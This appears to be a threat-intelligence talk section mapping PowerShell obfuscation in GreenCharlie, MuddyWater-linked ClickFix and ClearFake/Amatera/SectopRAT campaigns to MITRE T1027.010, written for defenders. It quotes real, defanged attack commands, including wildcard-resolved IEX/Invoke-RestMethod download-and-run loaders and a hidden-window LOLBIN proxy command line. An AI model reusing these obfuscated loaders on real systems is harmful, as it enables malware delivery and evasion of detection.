# Still Alive: T1027.010 in 2025–2026 Campaigns

**Section:** Talk Section 4 (5 min stage time) — "Still Alive: The Technique in 2025–2026"
**Purpose:** One focused write-up per modern campaign, centered specifically on the
PowerShell/command obfuscation pattern each one uses and how it maps to the five
T1027.010 manipulation categories defined in `guides/02-t1027-010-technique.md` §3
(aliases, wildcards, environment variables, string concatenation, special characters).
This is deliberately **not** a full campaign/IOC writeup — see each campaign's cited
vendor reporting below if you want the full picture (C2 infra, hashes, scale,
victimology).

All indicators below are defanged (`hxxp`, `[.]`). All quoted commands are reproduced
from the cited vendor reporting for teaching purposes only — none are complete,
runnable payloads, and no live C2 addresses are given as copy-pasteable indicators.

**The throughline this section exists to prove:** the STEEP#MAVERICK-era wildcard IEX
pattern (§4d of `guides/01-*`, the direct motivation for T1027.010) is not a historical
curiosity. The same primitive — resolve a sensitive cmdlet through `Get-Alias`/
`Get-Command` wildcard matching instead of typing its name — is present, largely
unchanged, in espionage tradecraft, suspected state-linked ClickFix operations, and
commodity crimeware shipping in 2025–2026. What changed across all three campaigns
below is the **delivery wrapper**, not the **inner obfuscation primitive**.

---

## 1. GreenCharlie — GORBLE / POWERSTAR / TAMECAT (Iran, 2024–2025)

**Source:** Picus Security, "GreenCharlie APT: Iran's PowerShell-Based Cyber Espionage
Campaigns."

### Delivery wrapper
Classic spearphishing-link initial access (ATT&CK T1566.002). GreenCharlie registers
large blocks of dynamic-DNS domains themed around cloud platforms, document editors,
and authentication portals — e.g., a `documentcloudeditor.ddnsgeek[.]com` domain
hosting a fake portal — to lure targets into a credential/consent flow that ultimately
lands a PowerShell payload. Picus's reporting places large-scale DDNS registration in
May 2024 and observed Iranian-IP C2 communication in July–August 2024. (Note: GreenCharlie
is sometimes described elsewhere as having an APT42 overlap; the Picus reporting cited
here documents Iranian attribution but does not itself assert that specific overlap, so
this write-up doesn't state it as sourced fact.)

### The obfuscation pattern — this is the point of the slide
GreenCharlie ships three related PowerShell malware families with a shared lineage:
**GORBLE**, **TAMECAT**, and **POWERSTAR**, chained as Downloader → Decrypter/Executor
→ C2 Beacon. The obfuscation-relevant details:

- **Wildcard cmdlet resolution (T1027.010 — Wildcards + Aliases).** Picus's reporting
  quotes a wildcard `Get-Command` invocation used to resolve a cmdlet at runtime
  instead of naming it directly:

  ```powershell
  &(gcm *v?k?-?x?re*).name $LastEx;
  ```

  This is structurally identical to the STEEP#MAVERICK-era pattern that motivated
  T1027.010 in the first place: `Get-Command`/`Get-Alias` fed a glob instead of a
  literal cmdlet name, so the string a signature would look for (e.g.,
  `Invoke-Expression`) never appears verbatim on the command line or in process
  creation logs — only the resolved *result* of the glob match does, and only in
  memory at invocation time. (Quoted byte-for-byte from the live Picus page, including
  the trailing `$LastEx;` argument.)

- **`ScriptBlock.Create` as an Invoke-Expression substitute (GORBLE variant).**
  Rather than avoiding `Invoke-Expression` through aliasing/wildcards, GORBLE avoids it
  structurally — it uses .NET's `[ScriptBlock]::Create()` to compile and run a string
  as code. This isn't one of the five T1027.010 categories verbatim, but it serves the
  identical evasion goal (defeat any detection rule keyed on the literal string
  `Invoke-Expression` or the alias `iex`) and is worth flagging on the slide as "the
  same intent, a different lever." TAMECAT and POWERSTAR, by contrast, use
  `Invoke-Expression` directly — a useful reminder that not every sample in a family
  bothers to obfuscate the same layer.

- **Encoding methods (T1027.010 — Encoding).** Payload strings undergo "a two-step
  decoding process: a standard Base64 decoding followed by a bitwise NOT operation on
  every byte":

  ```powershell
  $bytesOfRes[$i] = [Convert]::ToByte(([Convert]::ToString(-bnot $bytesOfRes[$i]), 2).SubString(24, 8), 2)
  ```

  This stacks a cheap, standard encoding (base64) with a second, non-standard
  transform (bitwise NOT) specifically so that a decoder tuned only for base64 does
  not recover a legible string — the same "layer obfuscation to defeat the obvious
  decode" logic seen in STEEP#MAVERICK's eight-layer chain.

- **Template string substitution.** `$decryptedString.Replace("____dest____",
  "$global:destination")` — a runtime placeholder-replacement pattern, adjacent to
  (but not identical to) the classic `"Wor"+"d.Application"` string-concatenation
  example MITRE gives for T1027.010. Worth a one-line mention, not a headline.

### Why this slide matters for the throughline
GORBLE's wildcard `Get-Command` line is the single cleanest 2024–2025 example of the
exact pattern that got T1027.010 written up. Put it next to the STEEP#MAVERICK slide
and the audience sees the primitive is unchanged three-plus years later.

---

## 2. MuddyWater-linked ClickFix Operations (Iran/MOIS, 2024–2025)

**Sources:** Proofpoint, "Around the World in 90 Days: State-Sponsored Actors Try
ClickFix" (confirmed MuddyWater/TA450 attribution and delivery mechanics, Nov 2024);
CISA/FBI/NSA/CNMF/NCSC-UK joint advisory AA22-055A (Feb 24, 2022 — MOIS attribution,
cited separately below because Proofpoint's article does not itself state it);
Fortinet FortiGuard Labs, "From ClickFix to Command: A Full PowerShell Attack Chain"
(Nov 2025 — the obfuscation-technical detail this slide needs, with attribution to
MuddyWater explicitly **hedged by Fortinet itself**).

**This is the one campaign in this section where the write-up leans on two sources
that don't fully agree with each other, and that needs to be said on stage, not
glossed over.**

### Delivery wrapper — confirmed MuddyWater tradecraft (Proofpoint)
Proofpoint documents TA450 (tracked elsewhere as MuddyWater / Mango Sandstorm) running
a ClickFix campaign on November 13–14, 2024 against at least 39 organizations, mostly
in the Middle East (UAE/Saudi Arabia emphasis). The MOIS attribution for MuddyWater
itself is **not** from Proofpoint's article — it's sourced separately from the joint
CISA/FBI/NSA/Cyber National Mission Force/NCSC-UK advisory AA22-055A (February 24,
2022), which states plainly: *"MuddyWater is a subordinate element within the Iranian
Ministry of Intelligence and Security (MOIS) and has conducted broad cyber campaigns
in support of MOIS objectives since approximately 2018."* Phishing emails
spoofed
`support@microsoftonlines[.]com` and impersonated a Microsoft security update,
instructing the recipient to open the Run dialog and paste a PowerShell command — the
canonical ClickFix flow: fake verification/update prompt → clipboard payload → Win+R →
manual execution by the victim, who does the "living off the land" step for the
attacker. The delivered payload installed **Level**, a legitimate RMM tool, for
persistent access. Proofpoint's broader piece places MuddyWater alongside Russia's
APT28 and North Korea's Kimsuky as nation-state actors independently adopting ClickFix
between October 2024 and January 2025 — i.e., this delivery wrapper is genuinely
multi-state tradecraft, not a MuddyWater one-off.

### The obfuscation pattern — from a campaign that *resembles* MuddyWater (Fortinet)
Proofpoint's November 2024 report doesn't quote obfuscated PowerShell content. For the
technical obfuscation detail this section needs, the best available reporting is
Fortinet's November 2025 analysis of a ClickFix-delivered, PowerShell-only RAT
targeting Israeli organizations. Fortinet is explicit that attribution is **not
confirmed**: *"Although this campaign exhibits significant resemblance to MuddyWater,
the absence of supporting clusters, novel tooling, and a few tactical deviations leaves
room for doubt. It may represent an evolution of the group's methodology, or the work
of a different threat actor borrowing from their playbook."* Present it on the slide
as "MuddyWater-style / suspected MuddyWater-adjacent," not as a confirmed MuddyWater
sample.

The ClickFix-delivered command Fortinet documents:

```
powershell IEX ((Invoke-RestMethod -Uri hxxps://pharmacynod[.]com/Fix...
```

decoding, at the next layer, to:

```powershell
IEX (Decompress-Base64-String "....")
```

Obfuscation techniques stacked in the chain (T1027.010 mapping):

- **Encoding (T1027.010 — Encoding).** Base64 encoding across three separately
  concatenated strings, then **double GZip compression** on top — two independent
  encoding layers stacked, not one.
- **Special characters to defeat pattern matching (T1027.010 — Special Characters).**
  String reversal applied **twice**, and URL-safe character substitution (`+` → `_`)
  so the base64 alphabet itself doesn't match a naive base64-detection regex.
- **String concatenation (T1027.010 — String Concatenation).** The three base64
  fragments are concatenated at runtime before decoding — the same "split it so no
  single signature matches the whole" logic as MITRE's canonical
  `"Wor"+"d.Application"` example.
- **Binary-to-ASCII conversion using a literal English word ("kendrick") as a
  delimiter** between decoded segments — a small but telling detail: obfuscation
  authors often pick meaningless-looking string delimiters specifically because they
  won't trip a signature written around meaningful keywords.

Unlike GreenCharlie and ClearFake/Amatera below, this sample does **not** show
alias/wildcard cmdlet resolution in the reporting available — it leans entirely on the
encoding/concatenation/special-character categories rather than the aliasing/wildcard
categories. That's a useful contrast point on the slide: T1027.010 is a five-category
technique, and different threat actors lean on different subsets of it.

The delivered payload is a PowerShell-only RAT (no dropped executable) supporting a
small command-code protocol (reinit, download, set sleep interval, execute PowerShell)
over a polling loop with randomized 2–7 second jitter — post-obfuscation tradecraft
worth a one-line mention but out of scope for this obfuscation-focused section.

---

## 3. ClearFake / Amatera Stealer / SectopRAT — Shared Crimeware Toolkit (2025–2026)

**Sources:** Expel, "ClearFake gets more evasive with new living off the land (LOTL)
techniques"; Blackpoint Cyber, "Novel fake CAPTCHA chain delivering Amatera Stealer";
Vega, "Fake CAPTCHAs, Smart Contracts, Real Risk: Unpacking a ClickFix Campaign
Delivering SectopRAT" (published at `vega.io/blog/clickfix-sectoprat-campaign`).

**This is the strongest single data point in this whole section**, because it isn't
one campaign — it's the *same* `gal`/`gcm` alias-and-wildcard code skeleton, directly
quoted from three independently-reported crimeware campaigns (ClearFake's own loader,
the Amatera Stealer chain, and a separate SectopRAT campaign). All three sources quote
`&(gal i*x)(&(gcm *stM*) '<payload URL>')` verbatim — the wildcard-resolution logic
itself is identical character-for-character across all three; only the payload URL in
the final argument differs between samples, which is exactly what you'd expect from
three different deployments of the same loader skeleton rather than three coincidental
reinventions of it. That's not three actors converging on a similar idea; that's
strong circumstantial evidence of a **shared traffic-distribution/loader toolkit**
being resold or reused across multiple crimeware operations. Flagged clearly: that
"shared toolkit" conclusion is this document's synthesis from cross-referencing the
three sources, not a claim any single source makes outright.

### Delivery wrapper — ClickFix, now blockchain-hosted
All three campaigns front-end with the ClickFix fake-CAPTCHA pattern: a compromised
(often WordPress) site shows a fake "verify you're human" prompt, and the victim is
walked through Win+R → paste → Enter. ClearFake's twist, per Expel, is **EtherHiding**:
the next-stage JavaScript (and, per Expel's reporting, the fake CAPTCHA content itself)
is retrieved from smart contracts on the BNB Smart Chain rather than from
attacker-controlled infrastructure directly — a delivery wrapper specifically designed
to survive domain/IP blocklisting, since the "infrastructure" is a public blockchain.
Expel's reporting places significant ClearFake ClickFix activity from late August 2025
onward, with an estimated ~147,000–150,000 infected systems inferred from unique IDs
recorded in the public smart contract (ClearFake's earliest recorded ClickFix adoption
traces to May 2024). Vega's SectopRAT write-up (Daniel Messing, published February 18,
2026) independently documents smart-contract-hosted loader delivery across 2,000+
compromised WordPress sites, routed through multiple smart contracts (a router
contract plus separate Windows-payload, macOS-payload, and victim-tracking contracts —
addresses omitted here as out of scope for an obfuscation-focused write-up), with
infrastructure overlap to the Amatera campaign consistent with a shared, multi-tenant
delivery pipeline.

### The obfuscation pattern — the LOLBIN-proxied alias/wildcard chain
The mechanism, consistent across all three sources:

1. **LOLBIN proxy execution.** The pasted command runs `SyncAppvPublishingServer.vbs`
   — a legitimate, Microsoft-signed VBScript that ships with Windows App-V
   (Application Virtualization) client tooling in `%WINDIR%\System32` — as an argument
   to `wscript.exe`. The script has a command-injection point in its argument
   handling: text after the script's expected input is passed through and executed.
   Critically, the PowerShell it spawns runs in **hidden window mode**
   (`-WindowStyle Hidden`). Blackpoint's own wording is precise here and worth quoting
   directly rather than paraphrasing loosely: *"Execution is initiated via
   wscript.exe, altering the process ancestry from the more common...
   explorer.exe → powershell.exe chain."* That means the correct process tree is
   **`explorer.exe → wscript.exe (cmdline: wscript.exe ...\SyncAppvPublishingServer.vbs
   "n;&(gal i*x)(...)") → powershell.exe`** — `explorer.exe` is still the root of the
   tree (the user really did launch this from the Win+R Run dialog, which is a child
   of `explorer.exe`), and `SyncAppvPublishingServer.vbs` is not a process node at
   all, it's the script argument on `wscript.exe`'s command line. What actually breaks
   is the *direct parent-child edge* `explorer.exe → powershell.exe`, which is what
   most naive Win+R/ClickFix detection rules key on — inserting `wscript.exe` as an
   intermediate hop defeats exactly that rule shape without removing `explorer.exe`
   from the ancestry chain altogether. This distinction matters directly for Section 5
   of this talk, which is built entirely around reading Sysmon Event ID 1
   process-creation ancestry. This LOLBIN-proxy step is itself worth flagging as a
   defense-evasion technique distinct from (but stacked with) T1027.010: it's not
   obfuscating the command's *content*, it's obfuscating the command's *parentage*.

2. **Alias + wildcard cmdlet resolution (T1027.010 — Aliases + Wildcards, the
   centerpiece).** Expel's reporting quotes the malicious argument passed to the VBS
   script:

   ```
   SyncAppvPublishingServer.vbs "n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/clock-cheking/expert-barnacle/load')"
   ```

   Unpacked: `gal` is the built-in alias for `Get-Alias`; `gal i*x` performs a
   wildcard lookup that resolves to the `iex` alias for `Invoke-Expression`. `gcm` is
   the built-in alias for `Get-Command`; `gcm *stM*` performs a wildcard lookup that
   resolves to `Invoke-RestMethod`. Neither `Invoke-Expression`,
   `Invoke-RestMethod`, `iex`, nor `irm` ever appears as a literal string in the
   command — only `gal`, `gcm`, and two short wildcard globs do. This is, primitive
   for primitive, the same construction as GreenCharlie's `&(gcm *v?k?-?x?re*).name`
   above and the STEEP#MAVERICK wildcard IEX pattern that motivated T1027.010 in the
   first place: resolve the sensitive cmdlet through `Get-Alias`/`Get-Command` glob
   matching so the signature-worthy string is never typed.

   Blackpoint's independent Amatera Stealer reporting documents **the same two
   primitives in the same form** — `gal i*x` reconstructing `Invoke-Expression`, `gcm
   *stM*` resolving `Invoke-RestMethod` — in a separately-delivered fake-CAPTCHA
   chain. And Vega's independently-reported SectopRAT campaign quotes the identical
   skeleton a third time, in a fuller command line that also shows the App-V proxy
   step in one shot:

   ```
   "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -NonInteractive -WindowStyle Hidden -ExecutionPolicy RemoteSigned -Command &{$env:psmodulepath = [IO.Directory]::GetCurrentDirectory(); import-module AppvClient; Sync-AppvPublishingServer n;&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/gh/routing78-fabric43-euw3/csz54-hrt8-s43-g984-gsdf555/unlovingconcrete456')}
   ```

   Three vendors, three separately-branded payloads (a ClearFake loader, Amatera
   Stealer, SectopRAT), and the `&(gal i*x)(&(gcm *stM*) '...')` skeleton is
   character-for-character identical in every one — only the final payload URL
   changes between samples. That's the strongest evidence in this entire section that
   this specific obfuscation snippet is shared tooling, not parallel invention.

3. **Environment variables as an execution gate (T1027.010 — Environment Variables,
   extended use).** Blackpoint documents the Amatera chain setting an environment
   variable (`ALLUSERSPROFILE_X`) to an opaque value as part of the initial pasted
   command, which a later stage checks for in the clipboard before proceeding — using
   the environment variable less as string-obfuscation material and more as a
   sandbox/no-interaction detector ("did a human actually paste and run this, or is a
   sandbox just replaying the string"). Worth calling out on the slide as an evolution
   *within* the environment-variable category: T1027.010 was written with env vars as
   an obfuscation/reconstruction mechanism; this usage repurposes the same primitive
   as an anti-analysis gate.

4. **Encoding and string reconstruction (T1027.010 — Encoding + String
   Manipulation).** Blackpoint documents thousands of misleadingly-named PowerShell
   variables each holding base64 fragments, reassembled at runtime and executed via
   `ScriptBlock.Create`; XOR encryption keyed with strings deliberately chosen to look
   like legitimate telemetry (`AMSI_RESULT_NOT_DETECTED`) rather than attacker
   material; and dynamic string reconstruction by extracting individual characters out
   of `$env:ComSpec` to rebuild sensitive strings at runtime rather than storing them
   as a literal. All three are direct instances of "environment variables /
   string-splitting / order-and-casing tricks" as MITRE's own T1027.010 text
   describes the category — just applied with more layers than the 2023-era baseline.

### Payloads
ClearFake's loader chain, per Expel, proxies through the same VBS/PowerShell
mechanism to fetch next-stage JavaScript/loaders. Blackpoint's Amatera Stealer chain
(Amatera is the successor branding for what was previously tracked as ACRStealer)
continues past the alias/wildcard stage into a multi-stage chain — Google Calendar
`.ics`-hosted configuration, PNG steganography (LSB-encoded payload inside CDN-hosted
images), and eventual native-code/shellcode execution — that is out of scope for this
obfuscation-focused write-up (see Blackpoint's own reporting, cited above, if the full
chain is needed elsewhere in the deck). Vega's
SectopRAT campaign shares infrastructure with the Amatera campaign and additionally
uses a renamed, signed Python interpreter ("bring-your-own-interpreter") to load a
fileless .NET stealer — again, a delivery/staging detail, not an obfuscation-layer
detail, and noted here only for completeness.

---

## Comparison Table: The Wrapper Evolved, the Primitive Didn't

| Campaign | Era / Actor | Delivery wrapper | Underlying T1027.010 primitive(s) | Verbatim example |
|---|---|---|---|---|
| **STEEP#MAVERICK** (baseline, for reference — see `guides/01-*`) | 2022, unattributed espionage | Spearphish (job-lure ISO/LNK) | Wildcard `Get-Alias`/`Get-Command` → `Invoke-Expression`/`Invoke-RestMethod`; 8-layer encoding chain | (see §4d, `guides/01-*`) |
| **GreenCharlie** (GORBLE/POWERSTAR/TAMECAT) | 2024–2025, Iran | Spearphishing link → fake cloud/document/auth portal (T1566.002) | Wildcards + Aliases (`gcm` glob resolution); Encoding (base64 + bitwise NOT); `ScriptBlock.Create` as IEX substitute | `&(gcm *v?k?-?x?re*).name` |
| **MuddyWater-linked ClickFix** | 2024 confirmed / 2025 suspected, Iran (MOIS) — 2025 sample's attribution is hedged by its own source | ClickFix fake update/CAPTCHA → Win+R paste | Encoding (base64 x3, double GZip); Special Characters (double string reversal, URL-safe substitution); String Concatenation | `IEX (Decompress-Base64-String "....")` |
| **ClearFake / Amatera / SectopRAT** (shared toolkit, synthesis — see above) | 2025–2026, crimeware | ClickFix fake CAPTCHA, blockchain-hosted (EtherHiding) next stage, proxied through a signed Windows LOLBIN | Aliases + Wildcards (`gal i*x`, `gcm *stM*`); Environment Variables (execution-gating); Encoding + String Manipulation (thousands of named base64 vars, `$env:ComSpec` char extraction) | `&(gal i*x)(&(gcm *stM*) 'cdn.jsdelivr[.]net/...')` |

**The point of this table, stated plainly for the talk:** across three unrelated 2024–
2026 campaigns spanning state-linked espionage, suspected state-linked ClickFix
operations, and pure commodity crimeware, the delivery wrapper visibly evolved —
spearphish link → ClickFix social engineering → blockchain-hosted, LOLBIN-proxied
payloads. The *inner* primitive — resolve a signature-worthy cmdlet name through
`Get-Alias`/`Get-Command` wildcard matching, or defeat pattern matching through
stacked encoding/concatenation/special characters — is structurally the same
technique STEEP#MAVERICK exhibited when T1027.010 didn't exist yet as a name for it.
That continuity is the entire argument for why T1027.010 coverage, not
campaign-specific IOC hunting, is the durable defense here.
